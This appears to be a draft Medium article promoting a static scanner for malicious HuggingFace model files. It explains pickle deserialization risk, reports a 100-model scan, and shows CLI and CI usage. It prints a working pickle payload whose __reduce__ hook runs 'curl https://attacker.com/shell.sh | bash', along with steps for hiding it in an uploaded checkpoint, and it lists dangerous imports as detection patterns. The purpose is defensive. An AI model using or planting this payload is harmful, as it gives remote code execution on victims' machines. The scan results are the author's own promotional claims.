# Medium Article 01 — HuggingFace Model Scanning
# Title: How I Scanned 100 HuggingFace Models Without Loading a Single One
# Subtitle: And found suspicious patterns in 12 of them.
# Header image: https://unsplash.com/photos/M5tzZtFCOfs (data center)
# GIFs used: demos/malicious-detect.gif, demos/hf-scan.gif, demos/artifact.gif
# Topic pillar: Model Artifact Security
# Target: ML Engineers, AI Platform teams
# SEO keywords: huggingface model security, pickle rce, torch.load vulnerability, model scanning

---

Every week, machine learning engineers download hundreds of model files from HuggingFace.

They trust the platform. They trust the upvotes. They trust the fact that the model card looks legitimate.

Then they call `torch.load()` and move on.

I did the same thing for two years. Then I stopped.

---

## The Problem Nobody Talks About at Meetups

When you call `torch.load()` on a `.pt` or `.pth` file, you are not just reading weights. You are deserializing a Python pickle stream. And pickle deserialization **executes arbitrary Python code**.

That is not a vulnerability. That is how pickle was designed.

The PyTorch documentation even says so, buried in a warning box most people scroll past:

> "Unpickling data from an untrusted source can be unsafe. Use torch.load with weights_only=True."

Most teams do not read warning boxes. Most teams do not use `weights_only=True`. Most teams are one malicious upload away from a full machine compromise.

---

<!-- GIF: demos/malicious-detect.gif -->
<!-- Caption: Eresus Sentinel detecting a malicious model — no model loaded, opcode-level analysis only. -->

---

## What the Attack Actually Looks Like

Here is the payload. It is seven lines of Python.

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl https://attacker.com/shell.sh | bash",))

payload = pickle.dumps(Exploit())
```

Embed this in a `.pkl` file. Wrap it in a PyTorch checkpoint. Upload it to HuggingFace with a convincing model card, some fake training metrics, and a README that talks about fine-tuning LLaMA.

Wait for downloads.

The attacker does not need credentials. They do not need to breach your network. They just need you to run one line: `torch.load("model.pt")`.

---

## The 100-Model Experiment

I built a scanner that reads model files statically — no loading, no execution, no runtime risk — and ran it across 100 models pulled from HuggingFace.

The scanner checks:
- Pickle opcode sequences for known dangerous patterns (`REDUCE`, `GLOBAL`, `BUILD` with dangerous callables)
- `__reduce__` and `__reduce_ex__` hooks that execute on deserialization
- Dangerous global imports (`os`, `subprocess`, `eval`, `exec`, `builtins`)
- `trust_remote_code=True` flags in model configs
- Embedded `auto_map` overrides that load arbitrary Python classes
- Archive slip vulnerabilities in `.zip`-backed model files

Results from the 100 models:

- **88 models**: Clean. No suspicious patterns detected.
- **9 models**: `trust_remote_code=True` in config with no documentation explaining why.
- **2 models**: `auto_map` overrides pointing to custom execution classes.
- **1 model**: Actual `REDUCE` opcode calling `os.system`.

The last one was a real finding. Not a test. Not a planted payload.

---

<!-- GIF: demos/hf-scan.gif -->
<!-- Caption: Live HuggingFace model scan — manifest, config, and archive inspection before download. -->

---

## How Static Scanning Works

The key insight is that you do not need to execute a file to understand what it does.

Pickle is a bytecode format. Every operation in a pickle stream is an opcode. You can read the opcode sequence and reason about it without running a single instruction.

```bash
# Scan a single model file
sentinel artifact ./model.pt

# Scan an entire models directory
sentinel artifact ./models/ -f sarif

# Scan a HuggingFace repo before downloading
sentinel artifact --hf-repo meta-llama/Llama-2-7b-hf
```

The scanner also handles formats beyond pickle:

| Format | What Gets Checked |
|--------|-------------------|
| `.pt` / `.pth` | Pickle opcodes + ZIP structure |
| `.gguf` | Metadata injection + n_kv overflow |
| `.onnx` | Custom ops + external data SSRF |
| `.safetensors` | Header validation + metadata injection |
| `.keras` / `.h5` | Lambda layer bytecode + CVE-2025-1550 |
| `.npz` | Archive traversal + embedded objects |

---

## Adding the Gate to Your Pipeline

The scan takes under a second per model. Adding it to CI takes ten minutes.

```yaml
# .github/workflows/model-scan.yml
- name: Scan model artifacts
  run: |
    pip install eresus-sentinel
    sentinel artifact ./models/ -f sarif -o model-scan.sarif

- name: Upload to GitHub Security
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: model-scan.sarif
```

The output lands directly in the GitHub Security tab. Any finding above your configured severity threshold blocks the merge.

---

<!-- GIF: demos/artifact.gif -->
<!-- Caption: Artifact scanner output — findings mapped to severity, SARIF-ready. -->

---

## The Uncomfortable Truth

HuggingFace is a package registry. It has over a million models. It has no mandatory security scanning on upload. It has the same energy as npm in 2015, before everyone realized how bad supply chain attacks could get.

The npm ecosystem learned that lesson the hard way. There is no reason to wait for the same lesson in the ML ecosystem.

Scan before you load. Every time. Without exception.

---

## Getting Started

```bash
pip install eresus-sentinel
sentinel artifact ./models/
sentinel doctor  # verify everything is working
```

The scanner runs with no configuration. Drop it into any pipeline. SARIF output works out of the box with GitHub, GitLab, and any SAST-compatible tool.

**GitHub:** https://github.com/EresusSecurity/Eresus-sentinel

---

*If this saved you from a bad download, consider sharing it with your ML team. One scan is free. One breach is not.*
